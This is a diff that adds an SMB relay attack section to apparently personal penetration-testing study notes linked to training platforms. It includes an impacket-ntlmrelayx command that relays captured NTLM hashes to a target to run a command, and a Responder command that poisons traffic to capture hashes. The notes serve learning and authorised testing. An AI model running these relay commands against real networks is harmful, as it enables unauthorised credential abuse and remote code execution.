@@ -237,6 +237,31 @@ A vulnerability in the SMB protocol allowing Remote Code Execution (RCE). It was
 
 <hr class="sep-both">
 
+## SMB Relay Attacks
+
+[![attacking_common_services](../../../cybersecurity/_badges/htb/attacking_common_services.svg)](https://academy.hackthebox.com/course/preview/attacking-common-services)
+[![breachingad](../../../cybersecurity/_badges/thm/breachingad.svg)](https://tryhackme.com/r/room/breachingad)
+
+<div class="row row-cols-lg-2"><div>
+
+SMB relay is an attack in which we relay the hash to another machine instead of cracking it. It only works if SMB signing is disabled.
+
+We can use [impacket](tools/impacket.md) script or [responder MultiRelay](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py).
+
+```shell!
+$ impacket-ntlmrelayx --no-http-server -smb2support -t IP -c '<command>'
+```
+
+You would usually have a [responder](/cybersecurity/red-team/tools/utilities/networking/responder.md) running with `SMB=Off`.
+
+```ps
+$ sudo responder -I tun0
+```
+</div><div>
+</div></div>
+
+<hr class="sep-both">
+
 ## 👻 To-do 👻
 
 Stuff that I found, but never read/used yet.
